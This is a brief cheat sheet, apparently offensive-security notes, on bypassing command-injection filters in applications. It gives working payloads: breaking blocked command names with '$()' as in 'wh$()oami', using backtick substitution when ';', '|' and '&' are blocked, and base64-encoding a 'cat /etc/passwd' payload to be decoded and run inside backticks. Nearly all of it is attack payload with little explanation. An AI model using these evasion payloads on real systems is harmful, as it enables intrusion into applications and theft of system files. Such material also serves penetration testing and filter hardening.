# CMD Injection. How to bypass application protection mechanisms 

## if an application create command block list
we can use construction $()
Command bellow returns the same results:
```bash
wh$()oami 
```

```bash
whoami 
```
## if ;|& symbols are blocked 
we can use ``
```bash
echo "Payload: `ls | wc -l`"
```

## If separators or some commands are blocked 
we can use base64 or xxd  function
Create payload in attacker machine
```bash
echo "cat /etc/passwd" | base64
```
Or we can can encode payload using BurpSuite

Payload:
```bash
`echo "<resutl from command above>" | base64 -d`
```
